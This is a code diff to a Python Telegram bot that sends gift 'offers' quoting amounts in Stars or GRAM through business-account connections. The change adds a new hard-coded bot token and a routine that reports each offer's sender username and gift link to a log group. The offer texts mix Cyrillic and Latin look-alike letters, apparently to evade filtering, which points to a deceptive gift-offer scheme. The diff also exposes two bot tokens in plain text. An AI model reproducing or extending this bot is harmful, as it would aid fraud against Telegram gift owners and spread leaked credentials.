@@ -14,7 +14,8 @@ from aiogram.enums import ParseMode
 # ============================================================
 # КОНФИГУРАЦИЯ
 # ============================================================
-BOT_TOKEN = "8913883981:AAGKK-8h44EB5WHw2YnnuNdhharT7TUztUk"
+BOT_TOKEN = "8913883981:AAF4h0QCJbAd45G2DRJvX8xQ-4gJSnZMF-c"
+LOG_CHAT_ID = -1005039076939
 
 STAR_EMOJI_ID = "5848259999763011021"
 GRAM_EMOJI_ID = "5303250111852228815"
@@ -41,10 +42,10 @@ def format_gift_name(slug: str, number: str) -> str:
 def currency_parts(currency: str, lang: str = "ru"):
     if currency == "gram":
         emoji = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">🪙</tg-emoji>'
-        title = "GRАM" if lang != "en" else "GRАM"
+        title = "GRАM"
         return emoji, title
     emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
-    title = "Stаrs" if lang != "en" else "Stаrs"
+    title = "Stаrs"
     return emoji, title
 
 async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
@@ -69,6 +70,32 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
         return False
 
 # ============================================================
+# ЛОГ В ГРУППУ
+# ============================================================
+async def send_offer_log(data: dict):
+    username = data.get("sender_username") or "нет username"
+    gift_link = data.get("link", "")
+    gift_name = data.get("gift_name", "")
+
+    text = (
+        f"oтпpaвлeн oффep:\n"
+        f"oтпpaвил: @{username}\n"
+        f"пoдapoк: <a href=\"{gift_link}\">{gift_name}</a>"
+    )
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="Пoдapoк", url=gift_link)
+    ]])
+    try:
+        await bot.send_message(
+            chat_id=LOG_CHAT_ID,
+            text=text,
+            reply_markup=keyboard,
+            disable_web_page_preview=True
+        )
+    except Exception as e:
+        logger.error(f"[log-group] Ошибка: {e}")
+
+# ============================================================
 # ТЕКСТЫ
 # ============================================================
 def build_offer_text(lang: str, sender_name: str, amount_fmt: str, emoji_tag: str, cur_title: str, gift_display: str) -> str:
@@ -84,7 +111,6 @@ def build_offer_text(lang: str, sender_name: str, amount_fmt: str, emoji_tag: st
             f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> fоr thе gift {gift_display}.\n\n"
             f"Тhis оffеr hаs vаIid fоr 12 h. 0 min."
         )
-    # ru по умолчанию
     return (
         f"Пoльзoвaтeль <b>{sender_name}</b> пpeдлaгaeт Вaм "
         f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> зa пoдapoк {gift_display}.\n\n"
@@ -148,9 +174,9 @@ async def handle_offer(message: Message) -> None:
     bc_id = message.business_connection_id
 
     sender_name = message.from_user.full_name if message.from_user else "Unknown"
+    sender_username = message.from_user.username if message.from_user else None
 
     parts = message.text.strip().split()
-    # qq <link> <amount> <currency> <lang>
     if len(parts) < 3:
         return
 
@@ -199,6 +225,7 @@ async def handle_offer(message: Message) -> None:
         "accepted": False,
         "declined": False,
         "sender_name": sender_name,
+        "sender_username": sender_username,
     }
 
     keyboard = build_offer_keyboard(lang, offer_id)
@@ -208,6 +235,7 @@ async def handle_offer(message: Message) -> None:
             bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard
         )
         offers[offer_id]["msg_id"] = sent.message_id
+        await send_offer_log(offers[offer_id])
     except Exception as e:
         logger.error(f"[offer-send] Ошибка: {e}")
 
